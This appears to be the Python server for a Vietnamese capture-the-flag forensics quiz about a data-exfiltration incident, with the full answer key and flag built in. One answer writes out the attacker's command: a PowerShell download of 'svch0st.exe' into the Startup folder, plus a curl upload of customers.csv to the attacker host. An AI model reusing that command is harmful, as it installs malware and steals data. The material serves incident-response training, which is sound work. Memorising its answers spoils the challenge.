import socketserver
import time

# --- CẤU HÌNH FLAG CHÍNH THỨC ---
FLAG = "GDUCTF{n3v3r_g1v3_up_4lw4ys_h4v3_4_ch4nc3}" 

# --- BỘ CÂU HỎI VÀ ĐÁP ÁN ---
QUESTIONS = [
    {
        "context": "--- PHẦN 1: MẠNG (PCAP) ---\n[Câu 1] Qua quá trình giám sát hệ thống Team SOC phát hiện cuộc tấn công Data exfiltration attack. Sử dụng file capture.pcapng để trả lời các câu hỏi sau:",
        "q": "[Câu 1.1] Địa chỉ IP của attacker là gì?",
        "a": r"89.248.163.49"
    },
    {
        "q": "[Câu 1.2] User-Agent thực hiện hành vi đáng ngờ là gì?",
        "a": r"Edg/128.0.0.0"
    },
    {
        "q": "[Câu 1.3] Trả lời URI của request đáng ngờ:",
        "a": r"/roots/dstrootcax3.p7c"
    },
    {
        "q": "[Câu 1.4] Thông tin server của doanh nghiệp:",
        "a": r"Werkzeug/3.0.4"
    },
    {
        "q": "[Câu 1.5] Tên tệp mà attacker đã tải lên hệ thống:",
        "a": r"dstrootcax3.p7c",
        "flag_part": "GDUCTF{n3v3r_"
    },
    {
        "context": "--- PHẦN 2: TỆP HỆ THỐNG (MFT) ---\n[Câu 2] Sau khi báo cáo các thông tin thu thập được từ nhật ký mạng, công ty đã tiến hành trích xuất thêm tệp MFT để tìm kiếm thêm thông tin bổ sung về cuộc tấn công. Phân tích file MFT để trả lời các câu sau:",
        "q": "[Câu 2.1] Username của người dùng bị xâm nhập:",
        "a": r"Alice Wong"
    },
    {
        "q": "[Câu 2.2] Tên tệp độc hại được người dùng tải về (đường dẫn tuyệt đối):",
        "a": r"C:\Users\Alice Wong\Downloads\F0rtigate_setup.exe",
        "flag_part": "g1v3_up_"
    },
    {
        "context": "--- PHẦN 3: NHẬT KÝ SỰ KIỆN (EVTX) ---\n[Câu 3] Tiếp tục thu thập thông tin từ nhật ký sự kiện của hệ thống để tìm kiếm thêm thông tin của cuộc tấn công. Phân tích file log.evtx để trả lời các câu sau:",
        "q": "[Câu 3.1] Địa chỉ của Máy chủ C&C của Attacker:",
        "a": r"10.0.2.15"
    },
    {
        "q": "[Câu 3.2] Attacker đã sử dụng cách thức nào để tải mã độc về máy chủ:",
        # Giữ nguyên chuỗi payload dài khớp với script auto của người chơi
        "a": r'''C:\WINDOWS\system32\cmd.exe /c "powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile(\'http://10.0.2.15:8080/svch0st.exe\\',\\'C:\\Users\\Alice Wong\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\svch0st.exe\'); (New-Object System.NET.WebClient).DownloadFile(\'http://10.0.2.15:8080/svch0st.exe\\',\\'C:\\Users\\Alice Wong\AppData\Local\Temp\svch0st.exe\')" && curl -F "file=@C:\Users\Alice Wong\Downloads\customers.csv" http://10.0.2.15:5000/upload && del customers.csv"''',
        "flag_part": "4lw4ys_h4v3_4_"
    },
    {
        "context": "--- PHẦN 4: HỆ THỐNG MAIL SERVER (EML) ---\n[Câu 4] Tiếp tục thu thập thông tin từ hệ thống mail server của công ty để tìm kiếm thêm thông tin của cuộc tấn công. Phân tích file mail.eml để trả lời các câu hỏi sau:",
        "q": "[Câu 4.1] Đây là hình thức tấn công gì? (*** / ********)",
        "a": r"Phishing/Email spoofing"
    },
    {
        "q": "[Câu 4.2] Địa chỉ IP thực hiện tấn công?",
        "a": r"202.164.39.146"
    },
    {
        "q": "[Câu 4.3] Địa chỉ email giả mạo?",
        "a": r"peterzhang_abinmo@ablnnovations.com"
    },
    {
        "q": "[Câu 4.4] Công cụ thực hiện cuộc tấn công? (Kèm domain)",
        "a": r"emkei.cz",
        "flag_part": "ch4nc3}"
    }
]

class CTFHandler(socketserver.BaseRequestHandler):
    def send_msg(self, msg):
        self.request.sendall((msg + "\n").encode('utf-8'))
        time.sleep(0.05) 

    def handle(self):
        self.send_msg("===================================================================")
        self.send_msg("=== TEAM SOC - INVESTIGATION PORTAL (DATA EXFILTRATION ATTACK) ===")
        self.send_msg("===================================================================")
        self.send_msg("[!] Yêu cầu: Trả lời chính xác tuyệt đối các evidence thu thập được.")
        self.send_msg("[!] CẢNH BÁO: Nhập sai 1 ký tự, kết nối sẽ TỰ ĐỘNG BỊ CẮT.\n")
        
        for i, item in enumerate(QUESTIONS):
            if "context" in item:
                self.send_msg(f"\n{item['context']}")

            self.send_msg(f"{item['q']}")
            self.request.sendall(b"Answer: ") 
            
            try:
                answer = self.request.recv(4096).decode('utf-8').strip()
            except:
                return 

            if answer == item["a"]:
                self.send_msg("[+] Correct!\n")
                if "flag_part" in item:
                    self.send_msg(f"[*] BẠN ĐÃ QUA MÀN! Nhận mảnh ghép Flag: {item['flag_part']}\n")
                    self.send_msg("-------------------------------------------------------------------")
            else:
                self.send_msg("[-] Wrong! Bằng chứng không khớp. Đóng kết nối.")
                return 
        
        self.send_msg("\n[+] XUẤT SẮC! Bạn đã trả lời đúng tất cả các câu hỏi vụ án.")
        self.send_msg("[*] Hãy ghép cả 4 mảnh nhỏ ở trên lại để được Flag hoàn chỉnh nhé!")
        self.send_msg("===================================================================\n")

if __name__ == "__main__":
    HOST, PORT = "0.0.0.0", 1334 
    print(f"[*] Netcat CTF Server is listening on {HOST}:{PORT}")
    print(f"[*] Sẵn sàng tiếp nhận kết nối từ mạng trường...")
    server = socketserver.ThreadingTCPServer((HOST, PORT), CTFHandler)
    server.allow_reuse_address = True
    server.serve_forever()